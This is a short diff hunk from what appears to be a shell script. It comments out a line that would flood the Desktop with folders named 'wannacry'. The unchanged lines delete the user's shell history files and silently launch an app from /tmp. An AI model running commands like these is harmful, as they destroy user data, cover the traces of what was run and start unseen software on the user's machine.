@@ -16,7 +16,7 @@ cd ~/Desktop
 
 rm -rf ~/.*history*
 
-mkdir wannacry{0..10000}
+# mkdir wannacry{0..10000}
 
 nohup open /tmp/laz/app/Laz.app > /dev/null
 
